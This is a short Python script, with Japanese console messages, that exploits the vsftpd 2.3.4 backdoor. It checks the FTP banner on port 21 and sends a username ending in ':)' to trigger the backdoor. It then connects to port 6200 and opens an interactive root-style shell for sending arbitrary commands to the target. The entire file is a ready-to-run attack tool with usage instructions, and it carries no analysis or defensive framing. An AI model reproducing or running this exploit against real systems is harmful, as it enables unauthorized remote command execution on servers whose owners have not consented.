import sys
import time
import socket

def exploit(ip):
    try:
        print("対象のサーバへ接続中...")
        ftp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        ftp.connect((ip,21))
        output = ftp.recv(1024).decode('utf-8')
        socket.setdefaulttimeout(10)

        if "vsftpd 2.3.4" in output.lower():
            print("対象のサーバにvsftpd2.3.4の脆弱性がありました.\n")
            print("攻撃を開始します")
            ftp.send(b'USER aaaa:)\n')
            ftp.send(b"PASS aaaa\n")
            time.sleep(2)
            print("攻撃完了!")
        else:
            print("vsftpd2.3.4は動いてないよ")

    except Exception as e:
        print('サーバへの接続ができません')
        print(e)
        ftp.close()
        sys.exit(1)

def connect_server(ip):
    try:
        backdoor = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        backdoor.connect((ip,6200))
        backdoor.settimeout(1.5)
        print("バックドアに接続するね")
        id_info = str.encode('id -u -n'+'\n')
        backdoor.send(id_info)
        host = backdoor.recv(1024).decode('utf-8')
        print("接続完了!")

        while True:
            shell_command = input(ip+'@'+str(host.strip())+"#:")
            try:
                command = str.encode((shell_command+'\n'))
                backdoor.send(command)
                response = backdoor.recv(1024).decode('utf-8')
                print(response)
                
            except socket.timeout:
                pass

            if shell_command.lower() == 'exit':
                print('セッションを切断します')
                backdoor.close()
                sys.exit(1)

    except Exception as e:
        print(e)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage ./vsftpd2.3.4_exploit.py <IP>')
        print('Example ./vsftpd2.3.4_exploit.py 127.0.0.1')
    else:
        exploit(sys.argv[1])
        connect_server(sys.argv[1])